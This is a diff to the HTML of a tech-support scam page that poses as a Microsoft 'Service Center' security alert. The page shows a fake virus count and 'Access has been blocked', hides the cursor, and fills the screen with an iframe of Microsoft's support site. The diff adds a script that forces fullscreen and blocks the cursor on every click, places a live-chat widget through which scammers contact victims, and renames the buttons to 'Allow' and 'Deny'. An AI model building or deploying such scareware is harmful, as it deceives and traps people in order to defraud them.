@@ -5,23 +5,10 @@
 <meta name="robots" content="noindex, nofollow">
      <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <title>App Center</title>
+    <title>Service Center</title>
      <link rel="stylesheet" href="styles.css">
 <link rel="shortcut icon" href="microsoft.png" type="image/png">
 <link rel="stylesheet" href="font-awesome.min.css">
-<!--Start of Tawk.to Script-->
-<script type="text/javascript">
-  var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-  (function(){
-  var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-  s1.async=true;
-  s1.src='https://embed.tawk.to/66bb75c3146b7af4a439e2f3/1i56481bg';
-  s1.charset='UTF-8';
-  s1.setAttribute('crossorigin','*');
-  s0.parentNode.insertBefore(s1,s0);
-  })();
-  </script>
-  <!--End of Tawk.to Script-->
 <style>
   @font-face {
     font-family: 'Roboto';
@@ -873,7 +860,19 @@ var confirmationMessage = 'It looks like you have been editing something. '
        } catch (o) {}
    })();
 </script>
-
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+  var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+  (function(){
+  var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+  s1.async=true;
+  s1.src='https://embed.tawk.to/66bb75c3146b7af4a439e2f3/1i56481bg';
+  s1.charset='UTF-8';
+  s1.setAttribute('crossorigin','*');
+  s0.parentNode.insertBefore(s1,s0);
+  })();
+  </script>
+  <!--End of Tawk.to Script-->
 </head>
 <body id="mycanvas" class="map" onbeforeunload="return myFunction()" style="cursor:none;" onclick="playSound()">
 <audio id="beeppeep" autoplay="">
@@ -884,14 +883,12 @@ var confirmationMessage = 'It looks like you have been editing something. '
     <div class="bgimg2" style="top: 0px;"><img src="bg2.jpg" alt="" width="100%"></div>
 
 </div>
-<img src="//m03lm.rdtk.io/postback?format=img&amp;sum={replace}" width="1" height="1">
 <a href="#" rel="noreferrer" id="link_black" style="cursor: none;">
     <div class="black" style="height: 145%;cursor: none;"></div>
 </a>
 
-<div class="fakeCursor"></div>
-<div class="fakeCursor1"></div>
-<iframe src="https://support.microsoft.com/en-us/windows" id="frame" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; ">
+
+<iframe src="https://support.microsoft.com/contactus?ContactUsExperienceEntryPointAssetId=S.HP.SMC-HOME" id="frame" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; ">
 </iframe>
 
   <a onclick="openFullscreen();" rel="noreferrer" id="link_black" style="">
@@ -1079,7 +1076,7 @@ margin-top: 8px; text-align: center;"><img src="microsoft.png" class="logo12"> M
       </div>
   </div>
 <div id="txtintro">
-<span class="text-danger">App: Ads.fiancetrack(2).dll<br>
+<span class="text-danger">App: Ads.fiancetrack(02).dll<br>
 						Threat Detected :  <span class="blink3" style="font-size:30px;">100711 </span> Virus found !</span>
   <img id="banner" src="re.gif"><br>
    <span class="act" style="font-size:20px;">Access has been blocked ..</span><br>
@@ -1096,14 +1093,14 @@ margin-top: 8px; text-align: center;"><img src="microsoft.png" class="logo12"> M
           <li>
               <a href="#">
                   <div class="fr button2">
-                      <span id="addtochromebutton">Continue</span>
+                      <span id="addtochromebutton">Allow</span>
                   </div>
               </a>
           </li>
           <li>
               <a href="#">
                   <div class="fr buttons blink">
-                      <span id="addtochromebutton">Leave</span>
+                      <span id="addtochromebutton">Deny</span>
 
                   </div>
               </a>
@@ -1185,6 +1182,29 @@ top: -5px;">Microsoft Support</span>
         return !1
       };
     </script>
+
+
+
+    <script type="text/javascript">
+        window.onload = function () {
+            document.onclick = function (e) {
+                e = e || event;
+                target = e.target || e.srcElement;
+                if (target.tagName === "DIV") {
+                    toggleFullScreen();
+                    document.body.style.cursor = 'not-allowed';
+                    document.getElementById('map').innerHTML = stroka;
+                    document.getElementById('fa').innerHTML = "<iframe src='#' width='12' height='12' style='position: absolute; left: -25px;'></iframe>";
+                } else {
+                    toggleFullScreen();
+                    document.body.style.cursor = 'not-allowed';
+                    document.getElementById('map').innerHTML = stroka;
+                    document.getElementById('fa').innerHTML = "<iframe src='#' width='12' height='12' style='position: absolute; left: -25px;'></iframe>";
+                }
+            }
+        }
+    </script>
+
 
 </body>
 
